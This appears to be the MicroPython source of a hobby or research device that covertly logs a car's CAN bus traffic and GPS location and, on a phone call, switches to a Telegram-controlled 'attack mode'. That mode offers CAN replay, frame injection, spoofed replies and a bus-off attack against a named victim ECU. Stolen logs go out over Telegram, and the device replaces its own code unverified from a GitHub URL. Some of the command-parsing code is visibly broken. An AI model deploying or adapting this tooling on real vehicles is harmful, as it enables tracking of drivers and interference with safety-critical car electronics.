# Created by Joshua Sonnet
# (c) 2020 under GLP-3.0

import binascii
import os

import machine
import utime

import pyb
from libs.SIM800L import Modem
from libs.telegram import TelegramBot
from libs.ublox_gps import MicropyGPS
from pyb import CAN, LED, RTC, UART


class CANLogger(object):
    def __init__(self):
        # Constants and variables #

        # UART cmd to en-/disable the GPS
        self.GPS_OFF = (0xB5, 0x62, 0x06, 0x04, 0x04, 0x00, 0x00, 0x00, 0x08, 0x00, 0x16, 0x74)
        self.GPS_ON = (0xB5, 0x62, 0x06, 0x04, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x17, 0x76)

        self.SIM_DISABLED = False
        self.GPS_LOG_TIME = 5000  # 5s
        self.SHUTOFF_TIME = 30000  # 30s of no CAN activity
        self.TOKEN = "REDACTED"

        self.VERSION = 1.0
        if 'sd' in os.listdir('/'):
            self.PATH = '/sd/'
        else:
            self.PATH = ''
        self.CAN_FILE = open(self.PATH + 'can.log', 'a+')

        # This will hold CAN IDs to be filtered for in the can log
        self.can_filter = []
        self.allowed_users = ["610574975"]
        self.interrupt = False
        self.shutdown = False

        # Init modules #

        # GPS init
        self.gps_uart = UART(1, 9600)  # init with given baudrate
        self.gps_uart.init(9600, bits=8, parity=None, stop=1, read_buf_len=512 // 2)  # init with given parameters
        self.gps = MicropyGPS()

        # CAN init (500 MHz)
        self.can = CAN(1, CAN.NORMAL)  # recv
        self.can2 = CAN(2, CAN.NORMAL)  # send
        self.can.init(CAN.NORMAL, prescaler=4, sjw=1, bs1=14, bs2=6, auto_restart=True)
        self.can2.init(CAN.NORMAL, prescaler=4, sjw=1, bs1=14, bs2=6, auto_restart=True)
        self.can.setfilter(0, CAN.MASK16, 0, (0, 0, 0, 0))

        # SIM800L init
        sim_uart = UART(4, 9600, timeout=1000, read_buf_len=2048 // 4)
        self.modem = Modem(sim_uart)
        self.modem.initialize()

        try:
            self.modem.connect('internet.eplus.de')
        except:
            self.SIM_DISABLED = True
            print("LOG ONLY MODE (NO GSM)")

        # Clock init
        self.rtc = RTC()
        self.rtc.wakeup(5000)  # wakeup call every 5s

        # Interrupt Flag init
        self.interrupt = False
        pyb.ExtInt('X5', pyb.ExtInt.IRQ_FALLING, pyb.Pin.PULL_UP, self.incoming_call)

        # Sleep pins for GSM
        self.gsm_sleep = pyb.Pin('X6', pyb.Pin.OUT_PP)
        self.gsm_sleep.value(0)

        if not self.SIM_DISABLED:
            # Software Update
            self.ota()

            # Telegram Bot
            self.telegram = TelegramBot(token=self.TOKEN, modem=self.modem)

    # Logs input to can.log
    # args will be separated by comma and printed each time a new line
    def log(self, *args, file='can.log'):
        # With this case writing to can.log is quite a lot faster, as closing a file takes ages due to writing to fs
        # But we must ensure to close the file at some point
        if file is not 'can.log':
            with open(self.PATH + file, 'a+') as f:
                print(','.join(args), file=f)
            os.sync()
        else:
            # ensure we have an open file
            # if self.CAN_FILE.closed:  # closed does not exists, thus need workaround below
            try:
                self.CAN_FILE.read()
            except OSError:
                self.CAN_FILE = open(self.PATH + 'can.log', 'a+')
            print(','.join(args), file=self.CAN_FILE)

    # Override is working
    def ota(self):
        url = 'https://raw.githubusercontent.com/jsonnet/CANLogger/master/version'
        response = self.modem.http_request(url, 'GET')

        # If a newer version is available
        if float(response.text) > self.VERSION:
            url = 'https://raw.githubusercontent.com/jsonnet/CANLogger/master/code/main.py'
            response = self.modem.http_request(url, 'GET')
            # Override existing main file and reboot
            with open(self.PATH + 'main.py', 'w') as f:
                print(response.text, file=f)
                # Force buffer write and restart
                os.sync()
                machine.soft_reset()

    # Callback function for incoming call to initiate attack mode
    def incoming_call(self, _):
        # Hangup call
        self.modem.hangup()

        # Reactivate logger if called during sleep phase
        if self.shutdown:
            self.shutdown = False
            self.gsm_sleep.value(0)
            self.sendGPSCmd(self.GPS_ON)

        for u in self.allowed_users:
            self.telegram.send(u, 'Ready in attack mode!')

        # light up yellow to indicate attack mode
        LED(3).intensity(16)

        self.interrupt = True

    # PoC for Telegram
    def message_handler(self, messages):
        for message in messages:
            # Check permitted users
            if message['id'] not in self.allowed_users:
                continue
            if message[2] == '/start':
                self.telegram.send(message[0], 'CAN Logger in attack mode, ready for you!')
            else:
                if message['text'] == "log":
                    params = message['text'].strip().split(" ")[1:]
                    # get
                    if params[0] == 'get':
                        self.telegram.sendFile(message[0], open(self.PATH + 'can.log', 'rb'))
                        # with open(self.PATH + 'can.log', 'r') as f:
                        #    data = f.read()  # Okay, will print \n explicitly!
                        # self.telegram.send(message[0], data)
                        os.remove(self.PATH + 'can.log')

                    # clear
                    elif params[0] == 'clear':
                        os.remove(self.PATH + 'can.log')

                    else:
                        self.helpMessage(message)

                elif message['text'] == "replay":
                    # Find first message of id and resend x times
                    params = message['text'].strip().split(" ")[1:]
                    if len(params) < 2:
                        self.helpMessage(message)
                        continue

                    id, times = params[0:1]

                    while True:
                        can_id, _, _, can_data = self.can.recv(0)

                        if can_id == id:
                            for _ in times:
                                self.can2.send(can_data, can_id, timeout=1000)
                            self.log("sent {} from {} {} times".format(can_data, can_id, times))
                            break
                elif message['text'] == "injection":
                    params = message['text'].split(" ")[1:]

                    if len(params) < 4:
                        self.helpMessage(message)
                        continue

                    can_id, can_data, times, _delay = params[0:2]
                    for _ in times:
                        self.can2.send(can_data, can_id, timeout=1000)
                        pyb.delay(_delay)
                elif message['text'] == "reply":

                    params = message['text'].strip().split(" ")[1:]
                    if len(params) < 4:
                        self.helpMessage(message)
                        continue

                    id, message, id_a, answer = params[0:3]

                    while True:
                        can_id, _, _, can_data = self.can.recv(0)

                        if can_id == id and can_data == message:
                            self.can2.send(answer, id_a, timeout=1000)
                            break
                elif message['text'] == "busoff":  # TODO WIP feature only manual at that point
                    params = message['text'].strip().split(" ")[1:]

                    if len(params) < 4:
                        self.helpMessage(message)
                        continue

                    mark_id, vic_id, payload, _delay = params[0:3]

                    self.can.setfilter(0, CAN.LIST16, 0, (mark_id, vic_id,))

                    # Clear buffer (maybe/hopefully)
                    for _ in range(5):
                        if not self.can.any(0):
                            break
                        self.can.recv(0)

                    count = 0
                    while count <= 5:
                        can_id, _, _, can_data = self.can.recv(0)
                        if can_id == mark_id:
                            pyb.delay(_delay)
                            self.can2.send(payload, vic_id, timeout=1000)

                        while True:
                            can_id, _, _, can_data = self.can.recv(0)
                            if can_id == vic_id and can_data != payload:
                                count = 0
                                break
                            count += 1

                    # reset filter
                    self.can.setfilter(0, CAN.MASK16, 0, (0, 0, 0, 0))
                elif message['text'] == "filter":  # CAN Log Filter by ID
                    params = message['text'].strip().split(" ")[1:]

                    # add
                    if params[0] == 'add':
                        for id in params[1:]:
                            self.can_filter.append(id)
                    # remove
                    elif params[0] == 'remove':
                        for id in params[1:]:
                            self.can_filter.remove(id)
                    # clear
                    elif params[0] == 'clear':
                        self.can_filter.clear()

                    else:
                        self.helpMessage(message)

                elif message['text'] == "ota":
                    self.ota()

                elif message['text'] == "help":
                    self.helpMessage(message)

                elif message['text'] == "exit":
                    LED(3).off()
                    self.interrupt = False

                self.telegram.send(message[0], 'Executed!')

    def helpMessage(self, message):
        helpme = """
                        log get|clear - Retrieve or clear saved can data log
                        replay id freq - Replay messages of given id
                        reply id message answer - Reply to a specified message with an answer
                        injection id data freq delay - Inject given can packet into bus at a given frequency
                        busoff marker victim payload freq - Manual BUS off attack for given victim
                        filter add|remove|clear id - Set a filter for when logging
                        ota - Check and update newest version
                        help - Displays this message
                        exit - Exit this mode and return to logging                
                    """
        self.telegram.send(message[0], helpme)

    def sendGPSCmd(self, cmd):
        for i in range(len(cmd)):
            self.gps_uart.writechar(cmd[i])

    def loop(self):
        gps_time = utime.ticks_ms()

        while True:
            # Check if new messages arrived after shutdown
            if self.shutdown and not self.can.any(0):
                pyb.stop()  # soft sleep (500 uA)
                continue
            elif self.shutdown and self.can.any(0):
                self.shutdown = False
                self.gsm_sleep.value(0)
                self.sendGPSCmd(self.GPS_ON)

            # Main loop
            if not self.interrupt:
                # Free memory
                # gc.collect()
                ## Logging mode ##

                # Only log gps once a few seconds
                if utime.ticks_ms() - gps_time >= self.GPS_LOG_TIME:
                    gps_time = utime.ticks_ms()

                    # if module retrieved data: update and log
                    if self.gps_uart.any():
                        self.gps.updateall(self.gps_uart.read())
                        self.log(str(self.rtc.datetime()), self.gps.latitude_string(), self.gps.longitude_string(),
                                 self.gps.speed_string())

                # Log new incoming can messages
                try:
                    # throws OSError
                    can_id, _, _, can_data = self.can.recv(0, timeout=self.SHUTOFF_TIME)
                    # Filter for CAN Log
                    if not self.can_filter or can_id in self.can_filter:
                        self.log(str(self.rtc.datetime()), str(can_id), binascii.hexlify(can_data).decode('utf-8'))

                except OSError:
                    # We timed out from can connection -> could mean car is shut down
                    self.shutdown = True
                    self.CAN_FILE.close()
                    os.sync()
                    self.gsm_sleep.value(1)
                    self.sendGPSCmd(self.GPS_OFF)
                    continue

            else:
                ## Attack mode ##
                self.CAN_FILE.close()  # Close log file first
                os.sync()
                while self.interrupt:
                    self.telegram.listen(self.message_handler)


if __name__ == '__main__':
    logger = CANLogger()
    logger.loop()
